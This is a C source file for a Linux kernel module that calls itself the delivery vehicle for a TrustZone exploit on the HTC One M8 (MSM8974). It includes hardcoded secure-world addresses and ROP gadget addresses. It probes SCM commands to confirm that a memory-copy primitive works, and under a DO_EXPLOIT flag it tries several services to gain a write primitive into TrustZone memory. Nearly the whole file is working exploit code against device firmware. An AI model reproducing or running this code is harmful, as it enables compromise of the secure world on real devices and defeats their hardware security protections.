/* tzmod - kernel-side delivery vehicle for the MSM8974 TrustZone exploit
 * ported to the HTC One (M8) Verizon TrustZone image (TZ.BF.2.0-2.0.0114).
 *
 * Stage 1 (this build): read-only recon. Verifies that the SCM plumbing
 * works and that our service/command IDs and data addresses are correct,
 * without zeroing or overwriting anything in TrustZone.
 */

typedef unsigned int u32;
typedef unsigned char u8;
typedef unsigned long ulong;

extern int printk(const char *fmt, ...);
extern int scm_call_atomic2(u32 svc, u32 cmd, u32 a1, u32 a2);
extern int scm_call_atomic3(u32 svc, u32 cmd, u32 a1, u32 a2, u32 a3);
extern int scm_call_atomic1(u32 svc, u32 cmd, u32 a1);
extern int scm_call(u32 svc, u32 cmd, const void *cbuf, u32 clen,
		    void *rbuf, u32 rlen);
extern ulong __get_free_pages(u32 gfp, u32 order);

#define PAGE_OFFSET 0xC0000000u
#define GFP_KERNEL  0xD0u
#define V2P(v)      ((u32)(v) - PAGE_OFFSET)

/* ---- cache maintenance (CP15, no kernel symbols needed) ---------------- */
static void cci(void *p, u32 len)   /* clean + invalidate by MVA */
{
	ulong a = (ulong)p & ~31UL, e = ((ulong)p + len + 31) & ~31UL;
	for (; a < e; a += 32)
		asm volatile("mcr p15, 0, %0, c7, c14, 1" :: "r"(a) : "memory");
	asm volatile("dsb" ::: "memory");
}
static void ci(void *p, u32 len)    /* invalidate by MVA (discard) */
{
	ulong a = (ulong)p & ~31UL, e = ((ulong)p + len + 31) & ~31UL;
	for (; a < e; a += 32)
		asm volatile("mcr p15, 0, %0, c7, c6, 1" :: "r"(a) : "memory");
	asm volatile("dsb" ::: "memory");
}

/* ---- SCM services ------------------------------------------------------ */
#define SCM_SVC_INFO   0x6
#define SCM_SVC_UTIL   0x3
#define SCM_SVC_ES     0x10
#define SCM_SVC_PRNG   0xA

#define IS_CALL_AVAIL_CMD 1
#define TZ_INFO_GET_DIAG  2
#define TZ_INFO_GET_FVER  3

/* ---- HTC TZ addresses (from htc_symbols.py, derived offline) ----------- */
#define BOUNDS_CHECK_DWORD_ADDRESS		0xFE8256A4u
#define VERSION_CODE_0_DWORD_ADDRESS		0xFE825DE8u
#define TZBSP_GET_DIAG_POINTER_ADDRESS		0xFE82B8B8u
#define TZBSP_SEC_ALLOWS_MEMDUMP_PTR		0xFE82B938u

#define SET_DACR				0xFE80FA20u
#define INVALIDATE_INSTRUCTION_CACHE		0xFE80F590u
#define BX_LR					0xFE80663Cu   /* +1 for thumb at call site */
#define LDR_R0_R0_R1_BX_LR			0xFE80A666u
#define LDR_R1_R1_STR_R1_R0_BX_LR		0xFE813B1Cu
#define STR_R0_R1_BX_LR				0xFE80972Eu
#define CODE_CAVE_ADDRESS			0xFE81DED0u

static u32 scratch_phys;
static u32 *scratch;

static u32 tz_fver(u32 code, u32 dst_phys, u32 len)
{
	return (u32)scm_call_atomic3(SCM_SVC_INFO, TZ_INFO_GET_FVER,
				     code, dst_phys, len);
}

/* SCM_SVC_UTIL / 0xB. Signature per the published exploit is (dst, src):
 * after its pointer is hijacked with "LDR R1,[R1]; STR R1,[R0]; BX LR" it
 * performs *dst = *src. Test whether the un-hijacked function already
 * behaves as a copy before we touch anything. */
static u32 tz_memdump(u32 dst_phys, u32 src_phys)
{
	return (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB, dst_phys, src_phys);
}

/* SCM_SVC_ES / 0x2 - the wild write. Published usage is (address, 0). */
static u32 tz_es_is_activated(u32 address, u32 val)
{
	return (u32)scm_call_atomic2(SCM_SVC_ES, 0x2, address, val);
}

/* SCM_SVC_PRNG / 1 - writes `len` random bytes to `address` (phys). */
static u32 tz_prng(u32 address, u32 len)
{
	return (u32)scm_call_atomic2(SCM_SVC_PRNG, 1, address, len);
}

static u32 tz_is_avail(u32 svc, u32 cmd)
{
	u32 in = (svc << 10) | cmd;
	u32 out = 0;
	int r = scm_call(SCM_SVC_INFO, IS_CALL_AVAIL_CMD, &in, 4, &out, 4);
	if (r) return 0xDEAD0000u | (u32)(-r);
	return out;
}

int init_module(void)
{
	ulong page;
	int i;
	static const struct { u32 svc, cmd; const char *name; } tbl[] = {
		{ SCM_SVC_INFO, 2,	  "get_diag" },
		{ SCM_SVC_INFO, 3,	  "fver_get_version" },
		{ SCM_SVC_ES,   1,	  "es_save_partition_hash" },
		{ SCM_SVC_ES,   2,	  "es_is_activated" },
		{ SCM_SVC_UTIL, 0xB,	  "security_allows_mem_dump" },
		{ SCM_SVC_PRNG, 1,	  "prng_getdata" },
	};

	printk("tzmod: === recon start ===\n");

	page = __get_free_pages(GFP_KERNEL, 0);
	if (!page) {
		printk("tzmod: scratch alloc FAILED\n");
		return -12;
	}
	scratch_phys = V2P(page);
	scratch = (u32 *)page;
	printk("tzmod: scratch phys=%x virt=%p\n", scratch_phys, scratch);

	/* 1. fver_get_version(0) should deposit 0x400000 into our buffer.
	 *    TrustZone writes behind the CPU's back, so the buffer has to be
	 *    cache-maintained by hand on both sides of the call. */
	{
		u32 ret;
		scratch[0] = 0xAAAAAAAAu;
		cci(scratch, 64);
		ret = tz_fver(0, scratch_phys, 4);
		ci(scratch, 64);
		printk("tzmod: fver(0) ret=%x -> %x (expect 400000)\n",
		       ret, scratch[0]);

		scratch[0] = 0xBBBBBBBBu;
		cci(scratch, 64);
		ret = tz_fver(1, scratch_phys, 4);
		ci(scratch, 64);
		printk("tzmod: fver(1) ret=%x -> %x (expect 400000)\n",
		       ret, scratch[0]);
	}

	/* 2. Which SCM commands does this TZ advertise? */
	for (i = 0; i < (int)(sizeof(tbl) / sizeof(tbl[0])); i++) {
		u32 a = tz_is_avail(tbl[i].svc, tbl[i].cmd);
		printk("tzmod: avail svc=%x cmd=%x %-24s = %x\n",
		       tbl[i].svc, tbl[i].cmd, tbl[i].name, a);
	}

	/* 3. Is security_allows_mem_dump already a copy primitive? Feed it a
	 *    source we control first, so the semantics are unambiguous. */
	{
		u32 ret;
		scratch[0] = 0x11112222u;
		scratch[1] = 0;
		cci(scratch, 64);
		ret = tz_memdump(scratch_phys + 4, scratch_phys);
		ci(scratch, 64);
		printk("tzmod: memdump(self) ret=%x -> %x (expect ret=0, val=11112222)\n",
		       ret, scratch[1]);

		scratch[1] = 0xDEADBEEFu;
		cci(scratch, 64);
		ret = tz_memdump(scratch_phys + 4, VERSION_CODE_0_DWORD_ADDRESS);
		ci(scratch, 64);
		printk("tzmod: memdump(TZ %x) ret=%x -> %x (want 400000)\n",
		       VERSION_CODE_0_DWORD_ADDRESS, ret, scratch[1]);
	}

	/* 4. Baseline: can we already write into TZ memory? Write the SAME
	 *    value back onto the fver(0) scratch, which is a no-op if it
	 *    succeeds. Expect this to FAIL while bounds checks are live. */
	{
		u32 ret = tz_fver(0, VERSION_CODE_0_DWORD_ADDRESS, 4);
		printk("tzmod: TZ-write baseline ret=%x (0=allowed, neg=blocked)\n",
		       ret);
	}

#ifdef DO_EXPLOIT
	/* ------------------------------------------------------------------
	 * Stage 2: characterise es_is_activated before trusting it.
	 * ------------------------------------------------------------------ */
	{
		u32 ret;
		int n;
		static const struct { u32 a, b; const char *what; } cases[] = {
			{ 0x00000000u, 0, "addr=0" },
			{ 0, 0, "addr=0 (dup)" },
			{ 0x0000A000u, 0, "addr=0xA000" },
		};

		/* (a) does it accept a plain low-memory address? */
		scratch[0] = 0x5A5A5A5Au;
		cci(scratch, 64);
		ret = tz_es_is_activated(scratch_phys, 0);
		ci(scratch, 64);
		printk("tzmod: es_act(scratch=%x,0) ret=%x -> %x\n",
		       scratch_phys, ret, scratch[0]);

		/* (b) re-write the pattern and try the TZ address again */
		scratch[0] = 0x5A5A5A5Au;
		cci(scratch, 64);
		ret = tz_es_is_activated(BOUNDS_CHECK_DWORD_ADDRESS, 0);
		ci(scratch, 64);
		printk("tzmod: es_act(bounds=%x,0) ret=%x\n",
		       BOUNDS_CHECK_DWORD_ADDRESS, ret);

		/* (c) a few more argument shapes for comparison */
		for (n = 0; n < 3; n++) {
			ret = tz_es_is_activated(cases[n].a, cases[n].b);
			printk("tzmod: es_act(%s) ret=%x\n",
			       cases[n].what, ret);
		}

		/* (d) does the TZ write now succeed? */
		ret = tz_fver(0, VERSION_CODE_0_DWORD_ADDRESS, 4);
		printk("tzmod: TZ-write after es_act ret=%x\n", ret);

		/* (e) is the value es_is_activated writes caller-controlled? */
		scratch[0] = 0x11111111u;
		cci(scratch, 64);
		ret = tz_es_is_activated(scratch_phys, 0x12345678u);
		ci(scratch, 64);
		printk("tzmod: es_act(scratch, 12345678) ret=%x -> %x\n",
		       ret, scratch[0]);

		/* (f) does prng_getdata validate its target? */
		scratch[0] = 0; scratch[1] = 0;
		cci(scratch, 64);
		ret = tz_prng(scratch_phys, 8);
		ci(scratch, 64);
		printk("tzmod: prng(scratch,8) ret=%x -> %08x %08x\n",
		       ret, scratch[0], scratch[1]);

		ret = tz_prng(BOUNDS_CHECK_DWORD_ADDRESS, 1);
		printk("tzmod: prng(bounds=%x,1) ret=%x\n",
		       BOUNDS_CHECK_DWORD_ADDRESS, ret);

		ret = tz_prng(0xFE8256A4u, 4);
		printk("tzmod: prng(bounds,4) ret=%x\n", ret);

		/* (g) Do the "set buffer" SCMs validate their target? Each takes
		 * a physical address that TZ later writes through - if any of
		 * them accepts a secure address we get a write primitive. */
		{
			static const struct { u32 svc, cmd; const char *n; } sp[] = {
				{ 0x3, 0x2,	"set_cpu_ctx_buf" },
				{ 0x3, 0x4,	"set_l1_dump_buf" },
				{ 0x3, 0x7,	"set_l2_dump_buf" },
				{ 0x3, 0x9,	"set_ocmem_dump_buf" },
				{ 0x6, 0x2,	"get_diag" },
				{ 0x1, 0x1,	"set_boot_addr" },
				{ 0xC, 0x2,	"sec_cfg_restore" },
				{ 0xC, 0xF,	"memprot_sd_ctrl" },
			};
			int k;
			for (k = 0; k < (int)(sizeof(sp)/sizeof(sp[0])); k++) {
				u32 a = (u32)scm_call_atomic1(sp[k].svc, sp[k].cmd,
							      0xFE8256A4u);
				u32 b = (u32)scm_call_atomic2(sp[k].svc, sp[k].cmd,
							      0xFE8256A4u, 4);
				u32 c = (u32)scm_call_atomic3(sp[k].svc, sp[k].cmd,
							      0xFE8256A4u, 4, 0);
				printk("tzmod: probe %-20s svc=%x cmd=%x n1=%x n2=%x n3=%x\n",
				       sp[k].n, sp[k].svc, sp[k].cmd, a, b, c);
			}
		}

		/* (h) security_allows_mem_dump(addr,len) validates [addr,addr+len)
		 * and then writes a bool to *addr. So calling it with a TZ
		 * address is itself a privileged write if the validator allows
		 * that range. Test secure vs non-secure targets. */
		{
			u32 r;
			r = (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB,
						  scratch_phys + 8, 4);
			printk("tzmod: sad(non-secure,4)      -> %x (want 0)\n", r);
			r = (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB,
						  0x0000A000u, 4);
			printk("tzmod: sad(0xA000,4)          -> %x (want 0)\n", r);
			r = (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB,
						  BOUNDS_CHECK_DWORD_ADDRESS, 4);
			printk("tzmod: sad(BOUNDS_DWORD,4)    -> %x\n", r);
			r = (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB,
						  VERSION_CODE_0_DWORD_ADDRESS, 4);
			printk("tzmod: sad(FVER_SCRATCH,4)    -> %x\n", r);
			r = (u32)scm_call_atomic2(SCM_SVC_UTIL, 0xB,
						  0x07A00000u, 4);
			printk("tzmod: sad(TZ app region,4)   -> %x\n", r);
		}

		/* (i) after the above, is the TZ write still blocked? */
		printk("tzmod: TZ-write final ret=%x\n",
		       (u32)tz_fver(0, VERSION_CODE_0_DWORD_ADDRESS, 4));

		/* (j) The TZ image has an RWX segment loaded at physical
		 * 0x07A00000. If the normal world can see that physical page,
		 * the validator accepting it as a "dumpable" address means TZ
		 * will write into its own code region on our behalf.
		 * Expected first words (from tz.img segment @0x558dc):
		 *   4604b570 f002460d b960ee6c 7070f245
		 */
		{
			volatile u32 *p = (volatile u32 *)(0x07A00000u
							   + PAGE_OFFSET);
			printk("tzmod: read 0x07A00000: %08x %08x %08x %08x\n",
			       p[0], p[1], p[2], p[3]);
			printk("tzmod: expect          : 4604b570 f002460d b960ee6c 7070f245\n");
		}
	}
#endif

	printk("tzmod: === recon end ===\n");
	return 0;
}

void cleanup_module(void)
{
	printk("tzmod: cleanup\n");
}
